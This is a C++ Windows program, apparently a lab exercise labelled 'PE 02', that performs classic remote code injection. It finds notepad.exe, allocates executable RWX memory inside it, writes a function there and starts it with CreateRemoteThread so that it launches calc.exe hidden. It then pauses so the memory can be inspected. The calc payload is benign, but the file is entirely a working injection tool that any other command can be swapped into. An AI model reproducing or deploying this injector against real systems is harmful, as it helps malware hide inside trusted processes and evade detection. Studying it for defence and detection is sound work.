#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

#pragma comment(lib, "user32.lib")

// Bộ quét RAM động tìm PID thích ứng theo tên tiến trình (Không phân biệt chữ hoa/thường)
DWORD GetTargetProcessPID(const std::wstring& procName) {
    DWORD pid = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // Sử dụng _wcsicmp để tự động nhận diện Notepad.exe bất kể chữ hoa thường
            if (_wcsicmp(procName.c_str(), pe32.szExeFile) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// 1. Định nghĩa cấu trúc con trỏ hàm tuyệt đối để xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm đích sẽ được tiêm vào lòng Notepad
// Hàm này gọi API hoàn toàn bằng địa chỉ tuyệt đối truyền qua lpParam để tránh lỗi nhảy RIP
DWORD WINAPI RemoteLaunchCalculator(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 02: CLASSIC CODE INJECTION REMOTE (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetName = L"notepad.exe";
    DWORD dwPID = GetTargetProcessPID(targetName);

    if (dwPID == 0) {
        MessageBoxA(NULL, "[-] Target process not found! Please open Notepad first.", "Error", MB_OK | MB_ICONERROR);
        return EXIT_FAILURE;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << dwPID << std::endl;

    // 1. Mở tiến trình đích với nhóm quyền cấu hình luồng bộ nhớ chéo
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwPID);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed!" << std::endl;
        return EXIT_FAILURE;
    }

    // Kích thước ước tính an toàn cho thân hàm thực thi
    SIZE_T functionSize = 500;

    // 2. Cấp phát phân vùng mã máy từ xa mang quyền RWX inside lòng Notepad
    LPVOID remoteCodeBuffer = VirtualAllocEx(hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteCodeBuffer) {
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Phan vung Code RWX da thiet lap tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // 3. Cấp phát phân vùng dữ liệu tham số từ xa mang quyền RW inside lòng Notepad
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteData) {
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // 4. Khởi tạo cấu trúc dữ liệu cục bộ trước khi đẩy sang tiến trình đích
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        // Lấy chính xác địa chỉ tuyệt đối của WinExec để truyền sang Notepad
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // 5. Đẩy dữ liệu cấu trúc và mã máy của hàm xuyên biên giới sang RAM tiến trình đích
    WriteProcessMemory(hProcess, remoteCodeBuffer, (LPVOID)RemoteLaunchCalculator, functionSize, NULL);
    WriteProcessMemory(hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ham va du lieu sang RAM Notepad hoan tat." << std::endl;

    std::cout << "[*] Dang khoi tao luong CreateRemoteThread tu xa..." << std::endl;

    // 6. Kích nổ Thread từ xa, ép CPU của Notepad nhảy vào vùng nhớ thực thi
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, pRemoteData, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateRemoteThread failed!" << std::endl;
        VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // Đợi luồng từ xa kết thúc chu kỳ xử lý mở máy tính
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "[+] Luong Thread tu xa da hoan thanh nhiem vu." << std::endl;

    // ── GÀI HỘP THOẠI ĐỂ ĐÓNG BĂNG MÃ ĐỘC, GIỮ LẠI VÙNG NHỚ TRÊN RAM NOTEPAD ──
    MessageBoxA(NULL,
        "[+] PAUSE: Check System Informer inside 'notepad.exe' Memory Map NOW for RWX!",
        "PE 02 Remote Verification",
        MB_OK | MB_ICONINFORMATION);

    // 7. Giải phóng tài nguyên triệt để chống rò rỉ bộ nhớ (Memory Leak)
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pRemoteData, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    std::cout << "[+] Quy trinh giai phong RAM tu xa hoan tat." << std::endl;
    return EXIT_SUCCESS;
}